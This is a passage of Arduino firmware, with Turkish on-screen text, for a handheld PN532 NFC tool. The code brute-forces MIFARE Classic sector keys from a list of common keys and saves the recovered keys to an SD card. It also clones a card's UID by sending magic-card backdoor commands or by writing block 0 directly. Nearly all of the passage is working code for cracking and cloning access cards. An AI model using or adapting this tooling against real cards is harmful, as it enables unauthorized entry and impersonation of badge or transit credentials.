      for (int k = 0; k < keyListLen; k++) {
        if (nfc.mifareclassic_AuthenticateBlock(uid, uidLen, sector * 4, 0, (uint8_t*)commonKeys[k])) {
          sectorCracked = true;
          foundKeys++;
          foundKeysLog += "S" + String(sector) + ": " + uidToString((uint8_t*)commonKeys[k], 6) + "\n";
          break; 
        }
      }
      
      display.fillRect(0, 30, map(sector, 0, 15, 0, 128), 10, WHITE);
      display.display();
    }

    display.clearDisplay();
    display.setCursor(0,0); display.println("Sonuc:");
    display.drawLine(0,10,128,10,WHITE);
    
    if (foundKeys > 0) {
       display.setCursor(0,20); display.print("Kirilan Sektor: "); display.println(foundKeys);
       display.setCursor(0,35); display.println("Sifreler SD Karta");
       display.setCursor(0,45); display.println("kaydedildi!");
       
       if(SD.begin(SD_CS_PIN)) {
         File f = SD.open("/keys.txt", FILE_APPEND);
         if(f) {
           f.println("--- YENI TARAMA ---");
           f.println("UID: " + uidToString(uid, uidLen));
           f.print(foundKeysLog);
           f.close();
         }
       }
    } else {
       display.setCursor(0,30); display.println("Sifre Bulunamadi!");
       display.setCursor(0,45); display.println("Kart ozel sifreli.");
    }
    
    display.display();
    while(checkButton() == 0) { delay(10); }
    currentState = MENU;
    needsRedraw = true;
  }
}

bool tryWriteUniversal(uint8_t *newUID) {
  uint8_t block0[16];
  for(int i=0; i<4; i++) block0[i] = newUID[i];
  block0[4] = block0[0] ^ block0[1] ^ block0[2] ^ block0[3]; 
  block0[5] = 0x08; block0[6] = 0x04; block0[7] = 0x00;       
  for(int i=8; i<16; i++) block0[i] = 0xFF;                   

  uint8_t response[32]; uint8_t len;
  nfc.inDataExchange((uint8_t[]){0x50,0x00,0x57,0xCD}, 4, response, &len);
  nfc.inDataExchange((uint8_t[]){0x43}, 1, response, &len);
  
  uint8_t writeCmd[18]; writeCmd[0]=0xA0; writeCmd[1]=0x00; 
  memcpy(&writeCmd[2], block0, 16);
  
  nfc.inDataExchange(writeCmd, 18, response, &len);

  uint8_t checkUID[7]; uint8_t checkLen;
  delay(10); 
  if(nfc.readPassiveTargetID(PN532_MIFARE_ISO14443A, checkUID, &checkLen, 50)) {
    if (checkLen == 4 && memcmp(checkUID, newUID, 4) == 0) {
      return true; 
    }
  }

  if(nfc.readPassiveTargetID(PN532_MIFARE_ISO14443A, checkUID, &checkLen, 50)) {
     if (nfc.mifareclassic_AuthenticateBlock(checkUID, checkLen, 0, 0, (uint8_t[]){0xFF,0xFF,0xFF,0xFF,0xFF,0xFF})) {
        if (nfc.mifareclassic_WriteDataBlock(0, block0)) {
            
            uint8_t verifyBuffer[16];
            if (nfc.mifareclassic_ReadDataBlock(0, verifyBuffer)) {
                if (memcmp(verifyBuffer, newUID, 4) == 0) {
                    return true; 
                }
            }
        }
     }
  }
  
  return false;
}

void showInfo(String title, String msg) {
  display.clearDisplay();
  display.setTextColor(WHITE);
  display.setCursor(0,0); display.println(title);
  display.drawLine(0,10,128,10,WHITE);
  display.setCursor(0,25); display.println(msg);
  display.display();
  delay(2000);
}

String uidToString(uint8_t *uid, uint8_t len) {
  String s = "";
  for(int i=0; i<len; i++) {
    if(uid[i]<0x10) s += "0";
    s += String(uid[i], HEX);
    if(i<len-1) s += " ";
  }
  s.toUpperCase();
  return s;
}

void parseHexString(String hexString, uint8_t* uid, uint8_t* len) {
  hexString.replace(" ", "");
  *len = hexString.length() / 2;
  for (int i = 0; i < *len; i++) {
    char c1 = hexString.charAt(i * 2);
    char c2 = hexString.charAt(i * 2 + 1);
    uid[i] = (hexCharToInt(c1) << 4) + hexCharToInt(c2);
  }
}

uint8_t hexCharToInt(char c) {
  if (c >= '0' && c <= '9') return c - '0';
  if (c >= 'A' && c <= 'F') return c - 'A' + 10;
  if (c >= 'a' && c <= 'f') return c - 'a' + 10;
  return 0;
}
